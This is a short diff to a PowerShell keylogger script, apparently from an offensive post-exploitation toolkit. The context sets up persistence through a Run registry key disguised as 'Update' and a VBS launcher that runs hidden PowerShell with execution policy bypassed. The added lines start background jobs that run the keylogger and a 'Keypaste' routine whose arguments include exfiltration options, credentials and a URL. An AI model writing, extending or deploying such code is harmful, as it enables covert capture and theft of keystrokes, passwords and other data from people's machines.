@@ -467,7 +467,7 @@ function script:Keylogger
 
 
 
-    $modulename = $script:MyInvocation.MyCommand.Name
+    $modulename = '27DE7628-520E-3CDA-9F1B-F39B324AC0CF.ps1'
     if($persist -eq $True)
     {
         $name = "persist.vbs" 
@@ -483,6 +483,9 @@ function script:Keylogger
         New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
         echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
         echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
+		
+		start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
+        start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
 
     }  
 
